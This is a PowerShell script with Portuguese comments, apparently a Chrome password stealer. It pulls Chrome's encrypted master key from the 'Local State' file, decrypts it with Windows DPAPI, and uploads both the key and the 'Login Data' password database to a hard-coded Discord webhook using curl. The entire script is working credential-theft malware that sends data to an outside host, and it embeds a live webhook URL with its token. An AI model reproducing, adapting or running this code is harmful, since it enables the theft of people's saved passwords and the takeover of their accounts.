$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"

# 1. Carrega a biblioteca de segurança do Windows
Add-Type -AssemblyName System.Security

try {
    # 2. Localiza os arquivos do Chrome
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

    # 3. Extrai a Chave Mestra
    $json = Get-Content $localState -Raw | ConvertFrom-Json
    $encryptedKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..255]
    
    # Comando direto de descriptografia (DPAPI)
    $masterKeyBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $masterKeyB64 = [Convert]::ToBase64String($masterKeyBytes)

    # 4. Manda a Chave para o Discord
    curl.exe -F "content=CHAVE:$masterKeyB64" $u

    # 5. Manda o Arquivo do Banco
    $temp = "$env:TEMP\L"
    Copy-Item $loginData $temp -Force
    curl.exe -F "file=@$temp" $u
    
} catch {
    $msg = "Erro_no_Script"
    curl.exe -F "content=$msg" $u
}
